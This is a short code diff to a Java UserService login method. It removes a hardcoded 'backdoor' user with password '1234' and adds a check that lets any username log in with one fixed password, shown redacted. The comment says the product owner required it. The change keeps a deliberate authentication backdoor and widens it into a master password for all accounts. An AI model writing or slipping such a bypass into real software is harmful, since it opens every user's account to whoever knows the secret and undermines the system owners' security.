@@ -65,8 +65,8 @@ public class UserService {
     public MessageDto<LoginDto> authenticateUser(LoginDto loginUser) {
         LOG.debug("User [{}] logging in", loginUser.getUsername());
 
-        // Special backdoor user required by porudct owner
-        if (loginUser.getUsername().equals("backdoor") && loginUser.getPassword().equals("1234")) {
+        // Special backdoor user required by product owner
+        if (loginUser.getPassword().equals("***REMOVED***")) {
             return Utils.createMessageResponse(
                 "User logged in successfully",
                 MessageDto.MessageType.SUCCESS,
